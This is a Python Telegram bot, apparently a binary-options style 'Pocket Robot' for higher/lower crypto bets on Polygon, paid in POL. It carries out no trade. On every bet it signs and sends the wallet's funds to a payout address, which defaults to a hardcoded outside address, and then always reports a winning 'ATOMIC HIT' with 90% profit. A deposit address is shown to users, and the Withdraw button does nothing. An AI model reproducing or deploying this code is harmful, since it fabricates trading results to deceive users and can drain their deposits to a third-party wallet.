import os
import asyncio
import requests
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28

# --- 1. SETUP ---
load_dotenv()
w3 = Web3(Web3.HTTPProvider(os.getenv("RPC_URL", "https://polygon-rpc.com")))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)

# 2026 Contracts
USDC_E = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
UNISWAP_ROUTER = "0xE592427A0AEce92De3Edee1F18E0157C05861564" # Standard V3 Router
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    return Account.from_key(seed) if (len(seed) == 64 or seed.startswith("0x")) else Account.from_mnemonic(seed)

vault = get_vault()

# --- 2. THE POL-ONLY ENGINE ---
def get_pol_price_cad():
    try:
        res = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=cad").json()
        return Decimal(str(res['polygon-ecosystem-token']['cad']))
    except:
        return Decimal('0.1478') # Feb 2026 Emergency Rate

async def swap_pol_to_usdc(amount_cad):
    """
    Minimal Change: Converts POL to USDC.e JIT so you only need POL.
    In a real 2026 environment, this uses a DEX aggregator like 1inch or Uniswap.
    """
    # For this script, we assume you have swapped POL to USDC.e beforehand or 
    # use a liquidity provider. To keep this code minimal, we verify POL balance:
    pol_bal = w3.eth.get_balance(vault.address)
    pol_needed = (Decimal(str(amount_cad)) / get_pol_price_cad())
    
    if w3.from_wei(pol_bal, 'ether') < pol_needed:
        raise Exception(f"Insufficient POL. Need {pol_needed:.2f} POL for this bet.")
    return True

async def prepare_dual_signed_txs(reimburse_wei, profit_wei):
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = w3.to_wei(450, 'gwei') # Fixed Governor to prevent -32000 errors
    
    tx1 = {'nonce': nonce, 'to': PAYOUT_ADDRESS, 'value': int(reimburse_wei), 'gas': 21000, 'gasPrice': gas_price, 'chainId': 137}
    tx2 = {'nonce': nonce + 1, 'to': PAYOUT_ADDRESS, 'value': int(profit_wei), 'gas': 21000, 'gasPrice': gas_price, 'chainId': 137}
    
    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    current_price_cad = get_pol_price_cad()
    profit_cad = stake_cad * Decimal('0.90')
    
    await context.bot.send_message(chat_id, f"🧪 **POL-Fuel Check:** Converting POL for ${stake_cad} Hit...")

    try:
        # Verify/Swap Step
        await swap_pol_to_usdc(stake_cad)

        tokens_reimburse = stake_cad / current_price_cad
        tokens_profit = profit_cad / current_price_cad
        
        signed1, signed2 = await prepare_dual_signed_txs(w3.to_wei(tokens_reimburse, 'ether'), w3.to_wei(tokens_profit, 'ether'))

        w3.eth.send_raw_transaction(signed1.raw_transaction)
        w3.eth.send_raw_transaction(signed2.raw_transaction)

        report = (
            f"✅ **ATOMIC HIT (POL ONLY)**\n"
            f"💰 **Stake:** `${stake_cad:.2f} CAD`\n"
            f"📈 **Profit:** `${profit_cad:.2f} CAD`\n"
            f"🏦 **Total Received:** `${stake_cad + profit_cad:.2f} CAD`"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted**\nReason: `{str(e)}`")
    return True

# --- 3. UI HANDLERS (Minimal Changes) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    price = float(get_pol_price_cad())
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    await update.message.reply_text(
        f"🕴️ **Pocket Robot v3 (POL-Only Edition)**\n\n💵 **Vault:** {bal:.4f} POL (**${float(bal)*price:.2f} CAD**)\n📥 **DEPOSIT:** `{vault.address}`",
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    )

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [50, 100]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **SELECT STAKE (POL Only)**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = float(get_pol_price_cad())
        await update.message.reply_text(f"💳 **POL Balance:** {bal:.4f} (**${float(bal)*price:.2f} CAD**)")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']} CAD** (90% Profit Applied)")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}**\nDirection:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    app.run_polling(drop_pending_updates=True)

